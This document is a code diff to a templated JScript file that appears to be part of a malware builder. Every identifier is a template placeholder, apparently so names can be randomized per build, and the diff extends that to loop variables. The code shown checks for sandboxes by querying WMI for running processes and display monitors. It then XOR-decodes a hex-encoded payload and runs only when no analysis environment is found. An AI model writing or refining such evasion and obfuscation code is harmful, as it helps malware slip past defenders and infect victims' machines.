@@ -34,7 +34,7 @@ function {{ v.fn_sandbox }}() {
         var {{ v.jsc_lv_pq }}  = {{ v.jsc_lv_wmi }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_proc_q }}]));
         for (var {{ v.jsc_lv_e }} = new Enumerator({{ v.jsc_lv_pq }}); !{{ v.jsc_lv_e }}.atEnd(); {{ v.jsc_lv_e }}.moveNext()) {
             var {{ v.jsc_lv_n }} = {{ v.jsc_lv_e }}.item().Name.toLowerCase();
-            for (var i = 0; i < {{ v.jsc_lv_bad }}.length; i++) { if ({{ v.jsc_lv_n }} === {{ v.jsc_lv_bad }}[i]) return true; }
+            for (var {{ v.jsc_lv_sli }} = 0; {{ v.jsc_lv_sli }} < {{ v.jsc_lv_bad }}.length; {{ v.jsc_lv_sli }}++) { if ({{ v.jsc_lv_n }} === {{ v.jsc_lv_bad }}[{{ v.jsc_lv_sli }}]) return true; }
         }
         var {{ v.jsc_lv_mq }} = {{ v.jsc_lv_wmi }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_monitor_w }}]));
         for (var {{ v.jsc_lv_em }} = new Enumerator({{ v.jsc_lv_mq }}); !{{ v.jsc_lv_em }}.atEnd(); {{ v.jsc_lv_em }}.moveNext()) {
@@ -83,8 +83,8 @@ function {{ v.fn_sandbox }}() {
     return false;
 }
 
-function {{ v.fn_hex2arr }}(h){var a=[];for(var i=0;i<h.length;i+=2)a.push(parseInt(h.substr(i,2),16));return a;}
-function {{ v.fn_xor }}(d,k){var o=[];for(var i=0;i<d.length;i++)o.push(d[i]^k[i%k.length]);return o;}
+function {{ v.fn_hex2arr }}(h){var {{ v.jsc_lv_ha }}=[];for(var {{ v.jsc_lv_hi }}=0;{{ v.jsc_lv_hi }}<h.length;{{ v.jsc_lv_hi }}+=2){{ v.jsc_lv_ha }}.push(parseInt(h.substr({{ v.jsc_lv_hi }},2),16));return {{ v.jsc_lv_ha }};}
+function {{ v.fn_xor }}(d,k){var {{ v.jsc_lv_xo }}=[];for(var {{ v.jsc_lv_xi2 }}=0;{{ v.jsc_lv_xi2 }}<d.length;{{ v.jsc_lv_xi2 }}++){{ v.jsc_lv_xo }}.push(d[{{ v.jsc_lv_xi2 }}]^k[{{ v.jsc_lv_xi2 }}%k.length]);return {{ v.jsc_lv_xo }};}
 
 if (!{{ v.fn_sandbox }}()) {
     var {{ v.jsc_lv_cx }} = -999, {{ v.jsc_lv_cy }} = -999;
